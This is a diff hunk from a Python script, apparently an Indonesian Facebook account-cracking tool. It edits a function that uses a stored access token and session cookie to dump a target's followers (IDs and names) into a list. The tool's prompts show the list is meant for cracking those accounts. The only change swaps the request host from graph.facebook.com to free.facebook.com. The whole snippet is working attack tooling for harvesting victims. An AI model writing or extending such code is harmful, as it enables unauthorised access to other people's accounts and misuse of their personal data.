@@ -1146,7 +1146,7 @@ def dump_pengikut():
 	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
 	pil = input('>> Masukkan Idz Target : ')
 	try:
-		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
+		koh2 = requests.get('https://free.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
